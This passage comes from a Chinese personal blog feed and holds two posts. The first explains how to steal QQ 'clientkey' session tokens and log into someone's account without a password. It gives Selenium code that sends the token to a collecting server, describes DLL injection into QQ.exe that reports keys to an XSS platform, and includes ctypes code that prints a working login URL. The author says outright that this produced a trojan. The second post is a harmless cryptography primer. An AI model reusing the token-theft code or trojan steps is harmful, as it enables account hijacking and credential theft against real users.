class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line"><span class="comment"># options.add_experimental_option(&#x27;excludeSwitches&#x27;, [&#x27;enable-logging&#x27;])</span></span><br><span class="line">options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">options.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>)</span><br><span class="line">options.add_argument(<span class="string">&#x27;log-level=3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome(chrome_options=options,executable_path=<span class="string">&#x27;chromedriver.exe&#x27;</span>)</span><br><span class="line"></span><br><span class="line">browser.get(</span><br><span class="line">    <span class="string">&quot;https://xui.ptlogin2.qq.com/cgi-bin/xlogin?appid=715030901&amp;daid=371&amp;pt_no_auth=1&amp;s_url=https%3A%2F%2Fbuluo.qq.com%2F&quot;</span>)</span><br><span class="line"><span class="comment"># browser.find_element_by_css_selector(&quot;a.face:nth-child(2)&quot;).click()</span></span><br><span class="line">pt_local_token = browser.get_cookie(<span class="string">&quot;pt_local_token&quot;</span>)[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">qqnumber = browser.find_element_by_css_selector(<span class="string">&quot;#qlogin_list &gt; a.face&quot;</span>).get_attribute(<span class="string">&quot;uin&quot;</span>)</span><br><span class="line"><span class="comment"># print(qqnumber)</span></span><br><span class="line"><span class="comment"># print(pt_local_token)</span></span><br><span class="line">browser.execute_script(</span><br><span class="line">    <span class="string">&#x27;window.location.href=&quot;https://localhost.ptlogin2.qq.com:4301/pt_get_st?clientuin=&#123;&#125;&amp;callback=ptui_getst_CB&amp;r=0.4266647630782271&amp;pt_local_tk=&#123;&#125;&quot;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        qqnumber, pt_local_token))</span><br><span class="line">clientuin = browser.get_cookie(<span class="string">&#x27;clientuin&#x27;</span>)[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">clientkey = browser.get_cookie(<span class="string">&#x27;clientkey&#x27;</span>)[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;http://ptlogin2.qq.com/jump?clientuin=&#123;&#125;&amp;clientkey=&#123;&#125;&amp;keyindex=9&amp;pt_aid=549000912&amp;daid=5&amp;pt_qzone_sig=1&amp;u1=http%3A%2F%2Fqzs.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&quot;.format(clientuin,clientkey))</span></span><br><span class="line"></span><br><span class="line">browser.quit()</span><br><span class="line">browser.service.stop()</span><br><span class="line">requests.get(<span class="string">&quot;http://127.0.0.1:5000/?clientuin=&#123;&#125;&amp;clientkey=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(clientuin,clientkey))</span><br></pre></td></tr></table></figure><p>这里没有请求本地获取QQ号，而是直接访问QQ快速登录的面板，等它获取到后，通过css选择器去获取页面中的QQ号元素。<br>最后请求本地的5000端口是本人起了一个flask的web来接收结果。<br>然而这种方法弊端很大。如果要写成木马，就要有隐蔽性，本人用了pyinstaller打包时，费了不少劲才把调用浏览器的调试窗口给隐藏掉。但是当换一台机子运行就不行了，因为selenium要有对应版本的浏览器驱动，就算打包好，别人电脑也不一定对应版本的浏览器，所以这份代码适用性不强。 </p><h1 id="直接调用本地接口"><a href="#直接调用本地接口" class="headerlink" title="直接调用本地接口"></a>直接调用本地接口</h1><p>虽然我们突破不了快速登陆的限制来获取clientkey，但是大佬们仍然还有别的路子—QQ应用程序中计算clientkey算法接口。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200120220043.png" alt=""><br>当我们从QQ面板进入QQ空间时也是不用密码的，如果细心一点可以发现，点击之后是经过一个跳转才登录QQ空间的。<br>登陆后的URL是这样的。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;user.qzone.qq.com&#x2F;QQ号&#x2F;infocenter</span><br></pre></td></tr></table></figure><p>我们在网址栏处按一下Ctrl+Z就可以得到跳转时的URL。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ssl.ptlogin2.qq.com&#x2F;jump?ptlang&#x3D;2052&amp;clientuin&#x3D;948375961&amp;clientkey&#x3D;9868C3C*******42CEB7D30E7875&amp;u1&#x3D;https:%2F%2Fuser.qzone.qq.com%2F948375961%2Finfocenter&amp;source&#x3D;panelstar</span><br></pre></td></tr></table></figure><p>clientkey又出现了,但是这个key和之前的不一样。<br>之前的key是224位的，这里出现的key是64位的。<br>这里码出两种key的利用方式。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ptlogin2.qq.com&#x2F;jump?ptlang&#x3D;2052&amp;clientuin&#x3D;QQ号码&amp;clientkey&#x3D;64位的KEY&amp;u1&#x3D;需要登陆的QQ服务网站地址</span><br><span class="line">http:&#x2F;&#x2F;ptlogin2.qq.com&#x2F;jump?clientuin&#x3D;QQ号&amp;clientkey&#x3D;224位的KEY&amp;keyindex&#x3D;9&amp;u1&#x3D;需要登陆的QQ服务网站地址</span><br></pre></td></tr></table></figure><p>他们的区别有什么，暂时还不知道，据说64位的key是权限最高的。<br>很明显64位的key就是在QQ的内存中。<br>直接贴出大佬的操作。<br>通过IDA附加定位到KernelUtil.dll中的?GetSignature@Misc@Util@@YA?AVCTXStringW@@PBD@Z函数，至于怎么知道是这个大佬说已经忘了。  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">CTXStringW *__cdecl Util::Misc::GetSignature(CTXStringW *a1, <span class="keyword">int</span> a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp-14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp-10h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp-Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp-8h] [ebp-8h]</span></span><br><span class="line">  </span><br><span class="line">  CTXStringW::CTXStringW(a1);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  sub_55404A73(&amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span> *))(*(_DWORD *)v5 + <span class="number">60</span>))(v5, a2, &amp;v6) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      sub_5536126A(&amp;v7, v6);</span><br><span class="line">      v2 = Util::Encode::Encode16(&amp;v4, &amp;v7);</span><br><span class="line">      CTXStringW::<span class="keyword">operator</span>=(a1, v2);</span><br><span class="line">      CTXStringW::~CTXStringW((CTXStringW *)&amp;v4);</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">        (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>))(*(_DWORD *)v7 + <span class="number">8</span>))(v7);</span><br><span class="line">    &#125;</span><br><span class="line">    sub_5540C87C(&amp;v6);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_5540C87C(&amp;v5);</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个参数，a1指针应该是存放结果的缓存区,a2是传入参数的指针。<br>通过查看交叉引用发现有两个函数调用了它。  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CTXStringW *__cdecl Util::Misc::Get32ByteValueAddedSign(CTXStringW *a1)</span><br><span class="line">&#123;</span><br><span class="line">  Util::Misc::GetSignature(a1, (<span class="keyword">int</span>)<span class="string">&quot;buf32ByteValueAddedSignature&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CTXStringW *__cdecl Util::Misc::GetValueSTHttp(CTXStringW *a1)</span><br><span class="line">&#123;</span><br><span class="line">  Util::Misc::GetSignature(a1, (<span class="keyword">int</span>)<span class="string">&quot;bufSTHttp&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用方式都是一样的，不同的就是一个传入buf32ByteValueAddedSignature，而另一个传入bufSTHttp。<br>很明显，32byte返回的是64位的key，而http的就是224位的key。<br>下面看看开源的一份利用模块，使用易语言编写的动态链接库，需要配合DLL注入器使用。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200123131658.png" alt=""><br>再提一下，获取QQ号的函数是?GetSelfUin@Contact@Util@@YAKXZ，利用方法大同小异，看一下如何获取clientkey就行了。<br>用注入器将DLL注入到QQ的进程空间并建立线程运行后，就可以取到KernelUtil的API函数地址，然后通过shellcode注入来调用函数。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200123131840.png" alt=""><br>写一个函数给线程运行，这里请求了XSS平台来接收结果。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200123133158.png" alt=""><br>编译出DLL，然后再写一下注入器。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200123133504.png" alt=""><br>做了个循环，如果没有QQ进程就10s检测一次，获取一次后就等一分钟再获取。<br>DLL和注入器同目录,用小号做了下测试。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200123133945.png" alt=""><br>本来只想研究一下，没想到就自己写了个木马出来-.-<br>只要木马没被杀，即使改了密码也能实时更新clientkey，就差个更狠点的自启动了。<br>但是这个木马还要带个DLL就不是很方便，然后在论坛找到了这个大佬整合的模块，于是把模块反编译看看怎么写的。<br>这个模块提供了许多方法。不仅仅有获取QQkey的，还有获取好友，Q群，后台发送消息等等，一些小白都可以写出功能齐全的QQ辅助。<br>先看看怎么写的。<br>初始化时就取好各个函数地址。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200123135446.png" alt=""><br>实际上这个模块只是再封装一次而已。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200123135804.png" alt=""></p><p>这个初始化时加载的常量是一个图片资源但并不是一张图片，结合加载和取函数方法都是一个叫PELoader的模块里的，可以确定这个常量实际是一个DLL，采用了内存DLL载入的方法。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200123140723.png" alt=""><br>将这个DLL导出后用PE工具查看一下输出表。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200123140550.png" alt=""><br>所以这个DLL才是实际的主角。。。<br>然后我又用Python写了一份DLL的调用。。。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> psutil</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetPidByName</span>(<span class="params">Name</span>):</span></span><br><span class="line">    pids = psutil.process_iter()</span><br><span class="line">    pidList = []</span><br><span class="line">    <span class="keyword">for</span> pid <span class="keyword">in</span> pids:</span><br><span class="line">        <span class="keyword">if</span> pid.name() == Name:</span><br><span class="line">            pidList.append(pid.pid)</span><br><span class="line">    <span class="keyword">return</span> pidList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Process_Name = <span class="string">&quot;QQ.exe&quot;</span></span><br><span class="line">QQ_Pids = GetPidByName(Process_Name)</span><br><span class="line"><span class="comment"># print(QQ_Pids)</span></span><br><span class="line">QQHelperDll = windll.LoadLibrary(<span class="string">&quot;QQHelperDLL.dll&quot;</span>)</span><br><span class="line">qq = QQHelperDll.getClientSelfUin(QQ_Pids[<span class="number">0</span>])</span><br><span class="line">clientkey_p = c_char_p(QQHelperDll.getClientkey(QQ_Pids[<span class="number">0</span>]))</span><br><span class="line">clientkey = clientkey_p.value.decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">print(clientkey)</span><br><span class="line">print(<span class="string">&quot;https://ssl.ptlogin2.qq.com/jump?ptlang=2052&amp;clientuin=&#123;&#125;&amp;clientkey=&#123;&#125;&amp;u1=https://user.qzone.qq.com/&#123;&#125;/infocenter&amp;source=panelstar&quot;</span>.<span class="built_in">format</span>(qq,clientkey,qq))</span><br></pre></td></tr></table></figure><p>运行后，输出了跳转url。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ssl.ptlogin2.qq.com&#x2F;jump?ptlang&#x3D;2052&amp;clientuin&#x3D;948375961&amp;clientkey&#x3D;53AB0361A9**********27ED73509D180B8612664C21A&amp;u1&#x3D;https:&#x2F;&#x2F;user.qzone.qq.com&#x2F;948375961&#x2F;infocenter&amp;source&#x3D;panelstar</span><br></pre></td></tr></table></figure><p>测试完美可用。。。<br>好了我要改密码了。。因为这意味着，这份DLL才是主角。而我已经没有精力去分析它的行为了。我根本不知道这份DLL的作者有没有在里面做些什么手脚。。。防人之心不可无，还是希望大家都是以学习为研究目的吧，不要做太多猥琐事，你搞我我搞你的。  </p><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>到这里相信大家很清楚了，防止QQ被盗不仅是谨慎输入账号密码这么简单。可以看到，网上已经提供了能后台操作QQ，功能丰富的模块。通过种种技术，整合到许多软件中。<br>为什么去网吧打一把大逃杀之后steam账号就被盗？您细品<br>对于没中招的朋友，不要随意运行不明来源的软件。中了招的朋友，重启电脑后进行病毒查杀并排除可疑软件，及时修改密码。<br>本文以本人的菜鸡水平讲述，若有错漏，不谨慎的地方请联系本人修改。<br>最后说一句，易语言牛逼~</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本人在14年时就对盗号的路子有些研究，因为那时很喜欢恶搞别人。而当时最简单的就是用易语言写的发信收信钓鱼软件，门槛极低。而本文并不是研究这种钓软或鱼站的原理，因为类似的这种手段都是诱骗鱼儿直接把账号密码送给别人，所以没什么好研究的，要再研究的话我个人觉得就要深入到心理学的方面了。那么这里研究的就是那种，我明明没有在哪里输入过QQ账号密码，但就是被别人控制了，甚至改密码后不一会又中招。这里讲到的，在没有泄露QQ账号密码，QQ却被玩弄于鼓掌的技术，我就简单地叫做QQkey利用。  &lt;/p&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://sncker.github.io/blog/categories/%E7%97%85%E6%AF%92/"/>
    
    
  </entry>
  
  <entry>
    <title>信息安全-基础知识</title>
    <link href="https://sncker.github.io/blog/2020/01/02/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>https://sncker.github.io/blog/2020/01/02/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</id>
    <published>2020-01-02T11:57:00.000Z</published>
    <updated>2020-05-06T01:24:26.681Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当使用互联网交换数据时，数据通过各种网络和设备到达另一方。因此，为了安全地使用互联网，安全技术是不可缺的。<br>本文通过围绕信息的安全传输讲解一些基本的、常见的安全技术来普及一些基本的安全知识，不特定深入去讲解某种技术，仅是用简单的语言去粗略地描述这种过程，目的是能通俗易懂地使读者理解。  </p><a id="more"></a><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="安全基础知识"><a href="#安全基础知识" class="headerlink" title="安全基础知识"></a>安全基础知识</h2><p>前面说到，数据是通过互联网传输的，而在互联网中，彼此之间是看不到对方的，因此就会出现一些问题。<br>接下来列举在互联网交换数据时可能出现的四种代表性问题。  </p><h3 id="窃听"><a href="#窃听" class="headerlink" title="窃听"></a>窃听</h3><p>当A方向B方发送信息时，信息传输过程中可能会被X方窃听。  </p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200102210140.png" alt=""></p><h3 id="欺骗"><a href="#欺骗" class="headerlink" title="欺骗"></a>欺骗</h3><p>当A方向B方发送消息时，B方可能会被X方欺骗，即X方冒充了B方。  </p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200102211015.png" alt=""></p><p>相反，即使B方相信他收到了A方的消息，A方也可能被X方欺骗。  </p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200102211044.png" alt=""></p><h3 id="伪造"><a href="#伪造" class="headerlink" title="伪造"></a>伪造</h3><p>即使A方确定了他的信息发送给了B方，在传输过程中，信息有可能被X方重写。  </p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200102211725.png" alt=""></p><p>当然，除了被第三方故意伪造之外，数据也有可能因为某种通信故障而被损坏。  </p><h3 id="否认"><a href="#否认" class="headerlink" title="否认"></a>否认</h3><p>当发送信息的A方有恶意时，A方可能坚持说“这不是他发到信息”。  </p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200102212750.png" alt=""></p><p>如果发生了这种情况，互联网上的商业交易和合同将不会成立。  </p><hr><p>这些问题不仅发生在人与人之间的交易中，同时在浏览网站时也会发生。  </p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200102213840.png" alt=""></p><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>为了解决第一个问题“窃听”，我们可以采用“加密”技术。</p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200103094713.png" alt=""></p><p>为了解决第二个问题“欺骗”，我们可以使用“消息认证码”，</p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200103095410.png" alt=""></p><p>或者“数字签名”技术。</p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200103095501.png" alt=""></p><p>为了防止第三个问题“伪造”，我们同样可以使用“消息认证码”或者“数字签名”技术。<br>同时“数字签名”技术也可以防止第四个问题“否认”。  </p><p>可以得到一下总结：  </p><table>    <tr>      <td>问题</td>      <td>解决</td>      </tr>    <tr>      <td>①窃听</td>      <td>加密</td>      </tr>        <tr>      <td>②欺骗</td>      <td rowspan="2">消息认证码<br>或者<br>数字签名</td>      </tr>      <tr>      <td>③否认</td>      </tr>      <tr>      <td>④窃听</td>      <td>数字签名</td>      </tr></table><p>还有一种叫做“数字证书”的技术，</p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200103101349.png" alt=""></p><p>它解决了“数字签名”技术中存在的“公钥持有人无法识别”这一个问题。  </p><h2 id="加密基础知识"><a href="#加密基础知识" class="headerlink" title="加密基础知识"></a>加密基础知识</h2><p>前面说到，数据在互联网中传输时，有可能会被第三方看到。所以对于一些重要的数据，我们有必要对其进行加密。而加密后的数据简称为密文。当A方给B方发送密文后，B方再将密文还原成原始数据，这个还原过程称为解密。即使密文传输过程中被第三方看到也是安全的。</p><p>接下来讲一下加密的具体操作。</p><p>首先，计算机使用数字0和1来管理任何二进制数据。</p><p>数据有很多种格式，如文字，音乐，电影等。。。他们在计算机中都以二进制数字形式进行管理。</p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200103102917.png" alt=""></p><p>基于此，我们将考虑加密技术。</p><p>数据是对于计算机有意义的数字序列。而密文也作为数字序列进行管理，但它是一个无法由计算机解释的随机数。</p><p>所以加密便是通过对数据进行某种操作来更改成计算机无法识别的随机数。</p><p>在加密的数值计算中，我们使用了“钥匙”，它也是由数值组成。所以，加密就是用钥匙来做数值计算，将数据转化为不能读取的东西。相反的，解密就是通过使用钥匙的数值计算来将密文还原成原始数据。</p><p>下面介绍一种简单的加密运算：异或加密。</p><p>异或运算：<br>0 XOR 0 = 0<br>1 XOR 1 = 0<br>0 XOR 1 = 1<br>1 XOR 0 = 1<br>即相同为0，不同为1。</p><p>逻辑异或的特性：A XOR B = C 等价于 A = B XOR C  （细细品味）</p><p>当A异或某个值得到C时，C也可以通过异或这个值来换取A。<br>在编程中，可以使用异或运算交换两个变量的值，而不需要借助临时变量。如果能自己实现这个过程，那么便对异或的特性理解透彻。  </p><p>接下来构造场景，我有一个文字文件，它在计算机中对应的二进制值为0101，我使用一个密钥key，对应1100。</p><p>通过异或，0101 XOR 1100 = 1001。</p><p>1001便是加密后的密文，它无法被计算机识别，即使识别出来也是无规则的乱码。  </p><p>当我们再次用这个密文去异或我们加密用的key时</p><p>1001 XOR 1100 = 0101</p><p>明文便被还原出来，这就是解密。  </p><p>至此便结束对加密基础的解释。</p><h2 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h2><p>哈希函数是将给定数据转化为固定长度的不规则值的函数。  </p><p>将数据输入到哈希函数中，就会输出不规则的值。<br>“ABC”-&gt;hash()-&gt;7f0579bc2d<br>输出的数值常会用16进制表示。  </p><p>虽然哈希值用16进制表示，但它同样是数值，在计算机中同样是以二进制的形式进行管理。所以哈希函数实质是在计算机内进行某种运算。</p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200103124749.png" alt=""></p><p>下面来看看哈希函数的特征。  </p><p>哈希函数第一个特征就是输出的哈希值长度不变。不管输入的数据很小或者很大，哈希值的长度保持不变。</p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200103125502.png" alt=""><br><img src="https://gitee.com/sncker/resource/raw/master/image/20200103125318.png" alt=""></p><p>第二个特征就是输入的数据相同，输出也必然相同。</p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200103125607.png" alt=""></p><p>第三个特征就是，即使输入的数据相近，输出的哈希值变化也很大。称为雪崩效应。</p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200103125740.png" alt=""></p><p>第四个特征就是，当输入两个不相同的数据时，哈希值有低概率相同。即哈希冲突（碰撞）。</p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200103125907.png" alt=""></p><p>第五个特征就是不能通过哈希值反推出原来的数据。</p><p>最后，求哈希值的计算一般是相对容易的。  </p><p>哈希函数算法在具有代表性的有：MD5,SHA-1和SHA-2等。而SHA-2是目前应用较为广泛的。<br>在网站的数据库中，用户的密码常常转为哈希值存储，即使数据库被拿下也不会泄露出用户的密码。  </p><h2 id="公共密钥加密"><a href="#公共密钥加密" class="headerlink" title="公共密钥加密"></a>公共密钥加密</h2><p>前面讲到，数据在互联网传输时，为了防止被第三方窃听，我们需要用到加密技术。发送方先将明文加密成密文，再将密文发送给接收方，接收方再解密。这种加密技术中，加密和解密都使用相同的密匙，所以也被称为对称加密。  </p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200103132332.png" alt=""></p><p>比较代表性的加密算法有：AES，DES，一次性加密等，其中AES应用最为广泛。</p><p>接下来想一下公共密钥加密可能发生的问题，我们回到A方向B方发送密文的时候。  </p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200103132659.png" alt=""></p><p>密文可能被X方窃听了。</p><p>这时我们假设A方和B方是无法直接沟通的，而B方不知道A方加密时用的密钥是什么，所以A方就要通过某种手段将密钥交给B方。就像密文传输一样，A方又在互联网上向B方发送了密钥。  </p><p>既然在互联网上传输，那么密钥同样可会被X方窃听到，这样X方就能解开密文得到明文。</p><p>如果A方用一个新的密钥去加密密钥，再将被加密的密钥发给B方，B方也不知道这个加密密钥用的新密钥。问题就会重演。这是公共密钥最大的问题。<br>总之，公共密钥需要一种安全的方法进行传送，这就是“钥匙交付问题”。<br>这个问题有两种解决方案，分别是使用“密钥交换协议”和“公开密钥加密”两种方法。</p><h2 id="公开密钥加密"><a href="#公开密钥加密" class="headerlink" title="公开密钥加密"></a>公开密钥加密</h2><p>公开密钥加密是加密和解密使用不同密钥的一种加密技术，因为使用了不同的密钥，也被称为非对称加密。加密使用的密钥称为“公开密钥”，解密使用的密钥称为“私有密钥”。</p><p>我们来简单的描述一下这个过程：</p><p>首先A方想给B方发送信息，这时B方需要创建一对密钥对，公开密钥（Public Key）和私有密钥（Secret key），然后将公开密钥发送给A方，A方就可以使用这个公开密钥加密明文，再将密文发送给B方，最后B方通过私有密钥还原出明文。<br>具有代表性的加密算法有：RSA加密算法和椭圆曲线加密算法等，最为广泛应用的是RSA算法。  </p><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200103171650.png" alt=""></p><p>因为公钥和密文都是通过互联网传输，所以有可能被X方窃听。但是公钥是无法解密密文的，所以X方无法得到原始数据。<br>还有一个好处就是，当多方之间进行通信时，发送信息的一方只需要拿到接收方的公钥就可以了。若使用公共密钥加密，那么密钥需求会随着人数的增多急剧上升。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200103173209.png" alt=""><br>而B方在收到密文后使用私钥还原出原始数据，不用为每个对象都准备相应的密钥。<br>需要保密的密钥由接收方保管，所以安全性也高。  </p><p>下面讲讲公开密钥加密可能存在的问题。<br>第一个问题是加密和解密都需要时间，所以不适合用于来回换取少量数据。<br>第二个问题是公钥的可靠性问题，因为公钥无法指示是谁创建了它，所以。。。<br>当X方想窃听A方和B方的信息时，X方可以创建一对密钥对PX和SX，<br>当B方给A方发送公钥PB时，X方可以拦截下PB，将PX发给A方。。。<br>由于公钥的来源无法得知，所以A方会用PX去加密信息并发送，这样X方就可以用SX去解密出来，再用拦截下来的PB去再次加密并转发给B方。。。这个过程中A方和B方都是没有意识的，也就是所谓的中间人攻击。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200104084115.png" alt=""></p><p>为了解决第一个耗时问题，可以采用“混合加密”技术。而第二个公钥可靠性问题，可以使用“数字证书”技术。</p><h2 id="混合加密"><a href="#混合加密" class="headerlink" title="混合加密"></a>混合加密</h2><p>所谓混合加密就是结合了公共密钥加密和公开密钥加密的优点。<br>我们知道公共密钥加密的速度快，但是密钥传输的安全性不能保障。<br>而公开密钥加密耗时，但是安全性高。<br>基于此，我们可以先使用安全性高的公开密钥加密去传输公共密钥加密使用的密钥，然后再用公共密钥加密去交换数据。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200104085445.png" alt=""><br><img src="https://gitee.com/sncker/resource/raw/master/image/20200104085517.png" alt=""><br>混合加密的速度和安全性都很有优势。像SSL（安全套接层）协议就是采用混合加密技术。<br>SSL协议升级改版后已经改名叫TLS（传输层安全），但由于SSL这个名字在人们心中根深蒂固，因此该协议也常称为SSL协议或SSL/TLS协议。  </p><h2 id="迪菲-赫尔曼密钥交换"><a href="#迪菲-赫尔曼密钥交换" class="headerlink" title="迪菲-赫尔曼密钥交换"></a>迪菲-赫尔曼密钥交换</h2><p>迪菲-赫尔曼（Diffie-Hellman）密钥交换是通过将双方共有的秘密数值隐藏在公开数值相关的运算中，来实现双方之间密钥的安全交换。  </p><p>我们先来理解一下这个概念：  </p><p>假设我们有一种方法，或称为运算，可以合并两个密钥：P+S=PS<br>需要注意的是，这里面的“+”符号知识代表这种运算，而非日常生活的加法。<br>这种运算可以合并密钥但不能分解，即：PS=?+S或PS=P+?<br>而且合成后的密钥还能继续合并P+PS=PPS<br>合成结果和合成顺序无关，只与使用了哪种密钥有关，即PPS=SPP=PSP</p><p>下面我们使用这种方法去交换密钥。<br>A方或B方准备一个密钥P，它相当于一个公开密钥，所以无需担心泄露，可以直接在互联网中发送给另一方。这时A方和B方都有了密钥P。<br>然后A方和B方各自准备自己的私钥SA和SB，并与P进行合成，分别得到P(SA)和P(SB)，再发送给对方。<br>最后A方使用得到的P(SB)和自己的SA合成P(SB)(SA)，同理B方得到了P(SA)(SB)，我们知道这两个合成密钥是等价的。<br>所以A方和B方可以使用这把合成密钥作为公共加密技术的密钥来交换数据。<br><img 